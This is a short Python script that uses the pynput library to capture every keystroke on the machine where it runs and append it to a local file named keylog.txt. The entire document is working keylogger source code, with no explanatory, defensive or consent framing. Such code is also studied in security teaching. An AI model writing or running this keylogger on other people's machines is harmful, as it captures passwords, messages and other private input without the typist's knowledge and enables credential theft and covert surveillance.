from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", "a") as logkey:
        try:
            logkey.write(key.char)
        except AttributeError:
            logkey.write(f"[{key}]")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()